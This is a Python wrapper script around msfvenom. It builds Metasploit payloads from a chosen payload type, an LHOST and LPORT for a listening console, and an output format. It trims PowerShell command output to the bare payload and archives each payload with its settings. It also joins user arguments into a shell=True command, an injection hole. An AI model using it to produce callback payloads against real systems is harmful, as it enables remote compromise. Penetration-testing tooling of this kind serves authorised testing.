#!/usr/bin/env python3

import subprocess
import os
import datetime
import shutil
import sys
import argparse

# Python wrapper for msfvenom

EXTERNAL_PROGRAM_NAME = "msfvenom"

def run_external_program(): 

    # Argument parsing
    parser = argparse.ArgumentParser(description="A python wrapper for MSFVenom")
    parser.add_argument("-p","--payload", help="Payload to use")
    parser.add_argument("-lp", "--LocalPort", help="The local port of your msfconsole")
    parser.add_argument("-lh", "--LocalHost", help="The IP of your msfconsole")
    parser.add_argument("-f", "--format", help="the format of the created file")
    parser.add_argument("-o", "--output", help="the name of the created file")
    parser.add_argument("-oh", "--OtherHelp", help="displays the msfvenom help page", action="store_true")
    args = parser.parse_args()

    # Check if msfvenom is installed on the system
    if shutil.which(EXTERNAL_PROGRAM_NAME) is None:
        print("Error: The external program'{EXTERNAL_PROGRAM_NAME}' was not found.")
        sys.exit(1)


    if len(sys.argv) == 1:
        print("No arguments passed")
        sys.exit(1)


    # Prep the msfvenom command and the directory that 
    # payloads will be auto-saved to. Create directory if it does not exist
    if args.OtherHelp:
        try:
            subprocess.run([EXTERNAL_PROGRAM_NAME, "--help"], check=True)
            sys.exit(0)
        except subprocess.CalledProcessError as e:
            sys.exit(1)

    else:
        try:
            flags = [EXTERNAL_PROGRAM_NAME, " -p ", args.payload, " LHOST=", args.LocalHost, " LPORT=", args.LocalPort, " -f ", args.format, " -o ", args.output]
            command_to_run = "".join(flags)
        except TypeError as e:
            print("Not all necessary flags are included")
            sys.exit(1)
    save_directory = "/home/kali/Desktop/payloads/"
    if not os.path.exists(save_directory):
        os.mkdir(save_directory)
        print("Directory Created")

 
    # Run the msfvenom command
    try:
        subprocess.run(command_to_run, check=True, capture_output=True, text=True, shell=True)

        # Removes everything prior to powershell.exe from a psh-cmd command 
        if args.format == "psh-cmd":
            print ("Success")
            init_file = open(args.output, 'r')
            payload = init_file.read()
            cleaned = payload[30:]
            init_file.close()
            os.remove(args.output)
            full_path = os.path.join(save_directory, args.output)
            fin_file = open(full_path, 'w+')
            fin_file.write(cleaned)
            fin_file.close()

        else: 
            src_file = args.output
            dst_file = os.path.join(save_directory, args.output)
            shutil.copy(src_file, dst_file)
            os.remove(args.output)

        # Creates a metadata file that saves the inputs for the command and timestamps the file
        date = f"{datetime.datetime.now().strftime('%d-%B-%H%M')}_"+args.output+".txt"
        full_path = os.path.join(save_directory, date)
        meta_file = open(full_path, 'w+')
        meta_file.write(args.payload+'\n'+args.LocalPort+'\n'+args.LocalHost+'\n'+args.format+'\n'+args.output)
        meta_file.close()

    except subprocess.CalledProcessError as e:
        print("External program failed with return code {e.returncode}")
        sys.exit(e.returncode)

# Main method
if __name__ == "__main__":
    run_external_program()
